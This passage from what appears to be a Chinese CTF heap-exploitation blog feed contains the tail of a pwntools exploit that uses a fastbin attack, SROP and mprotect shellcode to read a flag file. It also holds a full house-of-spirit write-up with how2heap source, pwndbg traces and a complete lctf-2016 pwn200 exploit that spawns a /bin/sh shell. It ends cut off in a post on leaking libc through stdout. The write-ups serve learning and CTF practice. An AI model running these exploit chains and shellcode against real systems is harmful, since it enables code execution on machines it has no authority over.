class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'2'</span>*<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(free_hook - <span class="number">0x13</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> </span><br><span class="line">frame.rip = libc_base + <span class="number">0xbc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line"><span class="keyword">print</span> len(frame)</span><br><span class="line">add(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span> + <span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'fff'</span> + p64(libc_base + libc.symbols[<span class="string">'setcontext'</span>] + <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x21102</span> </span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x202e8</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x1b92</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x33544</span></span><br><span class="line">jmp_rsp = libc_base + <span class="number">0x2a71</span></span><br><span class="line">payload = p64(pop_rdi_ret) + p64((free_hook) &amp; <span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x2000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">10</span>)  <span class="comment">#mprotect调用号</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xbc375</span>)</span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        sub rsp, 0x800</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor esi, esi</span></span><br><span class="line"><span class="string">        mov eax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        cmp eax, 0</span></span><br><span class="line"><span class="string">        js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov edi, eax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov edx, 0x100</span></span><br><span class="line"><span class="string">        xor eax, eax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov edx, eax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov edi, 1</span></span><br><span class="line"><span class="string">        mov eax, edi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        failed:</span></span><br><span class="line"><span class="string">        push 0x6c696166</span></span><br><span class="line"><span class="string">        mov edi, 1</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov edx, 4</span></span><br><span class="line"><span class="string">        mov eax, edi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        exit:</span></span><br><span class="line"><span class="string">        xor edi, edi</span></span><br><span class="line"><span class="string">        mov eax, 231</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      “巨鲸落，万物生，一念百草生，一念山河成”
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆学习之house of spirit</title>
    <link href="https://j-kangel.github.io/2020/03/26/%E5%A0%86%E5%AD%A6%E4%B9%A0%E4%B9%8Bhouse-of-spirit/"/>
    <id>https://j-kangel.github.io/2020/03/26/堆学习之house-of-spirit/</id>
    <published>2020-03-26T11:05:40.000Z</published>
    <updated>2020-03-26T05:18:52.983Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一直对house of系列的利用模棱两可，现在刚好可以利用疫情在家的时间好好梳理一下。</p><p>house of spirit（以下简称hos）是 <code>the Malloc Maleficarum</code> 中的一种技术。该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><h3 id="how2heap源码分析"><a href="#how2heap源码分析" class="headerlink" title="how2heap源码分析"></a>how2heap源码分析</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c" target="_blank" rel="noopener">源码</a></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>)；</span><br><span class="line">        </span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>调用一次malloc设置内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:11</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x603020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135137, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设存在某个可控的区域，例如栈上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:18</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$1 = (unsigned long long *) 0x7fffffffde28</span><br><span class="line">pwndbg&gt; p *a</span><br><span class="line">$2 = 140737488347640</span><br><span class="line">pwndbg&gt; p fake_chunks </span><br><span class="line">$3 = &#123;1, 140737488346448, 140737354129768, 15775231, 1, 4196589, 140737488346414, 0, 4196512, 4195760&#125;</span><br><span class="line">pwndbg&gt; p &amp;fake_chunks                                                               </span><br><span class="line">$4 = (unsigned long long (*)[10]) 0x7fffffffdcd0</span><br><span class="line">pwndbg&gt; x/10gx &amp;fake_chunks </span><br><span class="line">0x7fffffffdcd0: 0x0000000000000001      0x00007fffffffdd50</span><br><span class="line">0x7fffffffdce0: 0x00007ffff7ffe168      0x0000000000f0b5ff</span><br><span class="line">0x7fffffffdcf0: 0x0000000000000001      0x00000000004008ed</span><br><span class="line">0x7fffffffdd00: 0x00007fffffffdd2e      0x0000000000000000</span><br><span class="line">0x7fffffffdd10: 0x00000000004008a0      0x00000000004005b0</span><br></pre></td></tr></table></figure><p>设置fake_chunk的size和next chunk size来绕过检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:26</span><br><span class="line">pwndbg&gt; p fake_chunks                                                                 </span><br><span class="line">$5 = &#123;1, 64, 140737354129768, 15775231, 1, 4196589, 140737488346414, 0, 4196512, 4660&#125;</span><br><span class="line">pwndbg&gt; x/10gx &amp;fake_chunks                                                           </span><br><span class="line">0x7fffffffdcd0: 0x0000000000000001      0x0000000000000040  &lt;-fake_chunk size</span><br><span class="line">0x7fffffffdce0: 0x00007ffff7ffe168      0x0000000000f0b5ff</span><br><span class="line">0x7fffffffdcf0: 0x0000000000000001      0x00000000004008ed</span><br><span class="line">0x7fffffffdd00: 0x00007fffffffdd2e      0x0000000000000000</span><br><span class="line">0x7fffffffdd10: 0x00000000004008a0      0x0000000000001234  &lt;-next chunk size</span><br></pre></td></tr></table></figure><p>假设存在某个漏洞是我们可以free掉fake_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:30</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$6 = (unsigned long long *) 0x7fffffffdce0</span><br></pre></td></tr></table></figure><p>free(a)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:33</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x7fffffffdcd0 ◂— 0x0  &lt;- fake_chunk</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>malloc(0x30)或malloc(0x38)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint hos.c:34</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">malloc(0x30): 0x7fffffffdce0</span><br></pre></td></tr></table></figure><p>成功分配堆块到fake_chunk！</p><h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><ul><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求(&lt;= 128 on x64)，同时也得对齐</li><li>fake chunk 的 <code>ISMMAP</code> 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------</span><br><span class="line">|可控区域（设置fakesize）|</span><br><span class="line">-----------------------</span><br><span class="line">|不可控区域             |</span><br><span class="line">-----------------------</span><br><span class="line">|可控区域（设置nextsize）|</span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure><h3 id="例题：lctf-2016-pwn200"><a href="#例题：lctf-2016-pwn200" class="headerlink" title="例题：lctf-2016-pwn200"></a>例题：lctf-2016-pwn200</h3><h4 id="动态调试-1"><a href="#动态调试-1" class="headerlink" title="动态调试"></a>动态调试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx $rsp+8</span><br><span class="line">0x7fffffffdbe0: 0x000000000000000e      0x0000000000000000</span><br><span class="line">0x7fffffffdbf0: 0x00007fffffffdc10      0x00000000004009e0</span><br><span class="line">0x7fffffffdc00: 0x0000000000000000      0x00007ffff7ffe168</span><br><span class="line">0x7fffffffdc10: 0x00007fffffffdc60      0x0000000000400a8c</span><br><span class="line">0x7fffffffdc20: 0x00007fff0a626262(moeny) 0x0000000000000000</span><br><span class="line">0x7fffffffdc30: 0x0000000000000000      0x00007ffff7a43e90</span><br><span class="line">0x7fffffffdc40: 0x0000000000000009      0x00000000004008b5</span><br><span class="line">0x7fffffffdc50:(fake_chunk)0x0000000000003233      0x0000000000603010(堆地址，可修改)</span><br><span class="line">0x7fffffffdc60: 0x00007fffffffdcc0      0x0000000000400b34(函数返回地址)</span><br><span class="line">0x7fffffffdc70: 0x00007ffff7dd18e0      0x00007ffff7fd8700</span><br><span class="line">0x7fffffffdc80: 0x0000000000000003      0x0000000000000020(id)</span><br><span class="line">0x7fffffffdc90: 0x00007fff00616161(name) 0x00007ffff7a7cfb4</span><br><span class="line">0x7fffffffdca0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fffffffdcb0: 0x00007fffffffdcc0      0x00000000004007dd</span><br><span class="line">0x7fffffffdcc0: 0x00007fffffffdce0(rbp) 0x0000000000400b59</span><br><span class="line">0x7fffffffdcd0: 0x00007fffffffddc8      0x0000000100000000</span><br><span class="line">0x7fffffffdce0: 0x0000000000400b60      0x00007ffff7a2d830</span><br><span class="line">0x7fffffffdcf0: 0x0000000000000001      0x00007fffffffddc8</span><br><span class="line">0x7fffffffdd00: 0x00000001f7ffcca0      0x0000000000400b36</span><br><span class="line">0x7fffffffdd10: 0x0000000000000000      0xb01cdc16417a5d66</span><br></pre></td></tr></table></figure><p>name的大小为48，因此可以泄露rbp，可以看到：</p><ul><li>name_addr = rbp - 0x50</li><li>fake_chunk = name_addr- 0x90</li></ul><p>money的大小0x40，可以设置fake_chunk size = 0x40以及修改堆地址为fake_chunk的地址(0x7fffffffdc50)</p><p>id刚好为nextsize</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol><li>在name处写入shellcode</li><li>利用hos控制fake_chunk</li><li>修改函数返回地址为name地址，即shellcode地址</li><li>函数返回，执行shellcode</li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./pwn200"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"who are u?"</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span></span><br><span class="line">shellcode=<span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode += <span class="string">"\x2f\x2f\x73\x68\x56\x53\x54\x5f"</span></span><br><span class="line">shellcode += <span class="string">"\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="keyword">print</span> len(shellcode)</span><br><span class="line">payload = shellcode.ljust(<span class="number">48</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">rbp = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line">fake_chunk = shellcode_addr - <span class="number">0x40</span></span><br><span class="line">p.recvuntil(<span class="string">"give me your id ~~?"</span>)</span><br><span class="line">p.sendline(<span class="string">'32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"give me money~"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>) +p64(fake_chunk)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"how long?"</span>,<span class="string">"48"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(shellcode_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"money :"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      如果我会变成恶魔，那就随他吧。我会接受放逐，一切只为了保护她。
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="heap" scheme="https://j-kangel.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>利用_IO_2_1_stdout_泄漏libc</title>
    <link href="https://j-kangel.github.io/2020/03/13/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E6%BC%8Flibc/"/>
    <id>https://j-kangel.github.io/2020/03/13/利用-IO-2-1-stdout-泄漏libc/</id>
    <published>2020-03-12T22:10:55.000Z</published>
    <updated>2020-04-12T13:31:56.415Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h4><p>overlapping是一种堆块漏洞利用中相当常见的套路,非常好用，它比较常见的利用条件是off-by-one等堆漏洞。</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh</a></p><h4 id="IO-2-1-stdout"><a href="#IO-2-1-stdout" class="headerlink" title="_IO_2_1_stdout_"></a>_IO_2_1_stdout_</h4><p>查看stdout结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$4 = (struct _IO_FILE *) 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; p/x _IO_2_1_stdout_</span><br><span class="line">$7 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad2887, </span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd18e0, </span><br><span class="line">    _fileno = 0x1, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &#123;0xa&#125;, </span><br><span class="line">    _lock = 0x7ffff7dd3780, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd17a0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当stdout-&gt;_flags改变时，可能打印出libc地址，具体参考/usr/include/x86_64-linux-gnu/bits/libio.h </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 